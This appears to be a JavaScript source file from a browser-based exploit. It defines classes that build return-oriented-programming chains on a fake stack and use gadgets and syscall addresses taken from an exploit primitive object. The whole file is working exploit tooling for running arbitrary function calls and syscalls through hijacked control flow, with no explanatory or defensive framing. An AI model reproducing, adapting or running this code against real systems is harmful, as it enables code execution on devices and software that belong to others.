class rop {
    constructor(p, stack_size = 0x80000, reserved_stack = 0x10000) {
        this.stack_size = stack_size;
        this.reserved_stack = reserved_stack;
        this.stack_dwords = stack_size / 4;
        this.reserved_stack_index = reserved_stack / 4;

        this.stack_memory = p.malloc(this.stack_dwords + 0x2 + 0x200);
        this.stack_array = this.stack_memory.backing;
        this.zeroed_stack = new Uint32Array(this.stack_dwords);
        this.stack_entry_point = this.stack_memory.add32(reserved_stack);
        this.return_value = this.stack_memory.add32(stack_size);

        this.p = p;
        this.gadgets = p.gadgets;
        this.syscalls = p.syscalls;
        this.count = 0;
    }

    clear() {
        this.count = 0;
        this.stack_array.set(this.zeroed_stack);
    }

    push(value) {
        const index = this.reserved_stack_index + this.count++ * 2;
        if (value instanceof int64) {
            this.stack_array[index] = value.low;
            this.stack_array[index + 1] = value.hi;
        } else if (typeof value === "number") {
            this.stack_array[index] = value;
            this.stack_array[index + 1] = 0;
            if (value > 0xffffffff)
                alert("you're trying to write a value exceeding 32-bits without using a int64 instance");
        } else {
            alert("You're trying to write a non number/non int64 value?");
        }
    }

    push_write8(dest, value) {
        this.push(this.gadgets["pop rdi"]);
        this.push(dest);
        this.push(this.gadgets["pop rsi"]);
        this.push(value);
        this.push(this.gadgets["mov [rdi], rsi"]);
    }

    write_result(dest) {
        this.push(this.gadgets["pop rdi"]);
        this.push(dest);
        this.push(this.gadgets["mov [rdi], rax"]);
    }

    push_sysv(rdi, rsi, rdx, rcx, r8, r9) {
        const args = [rdi, rsi, rdx, rcx, r8, r9];
        const regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"];
        for (let i = 0; i < args.length; i++) {
            if (args[i] == undefined) continue;
            this.push(this.gadgets["pop " + regs[i]]);
            this.push(args[i]);
        }
    }

    fcall(rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.push_sysv(rdi, rsi, rdx, rcx, r8, r9);
        if (this.stack_entry_point.add32(this.count * 8).low & 8)
            this.push(this.gadgets["ret"]);
        this.push(rip);
    }

    add_syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }
}

class worker_rop extends rop {
    constructor(p, stack_size, reserved_stack) {
        super(p, stack_size, reserved_stack);
        this.p.pre_chain(this);
    }

    clear() {
        super.clear();
        this.p.pre_chain(this);
    }

    async call(rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(this.return_value);
        await this.run();
        return this.p.read8(this.return_value);
    }

    async syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
        return await this.call(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }

    add_syscall_ret(retstore, sysc, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(retstore);
    }

    async run() {
        await this.p.launch_chain(this);
        this.clear();
    }
}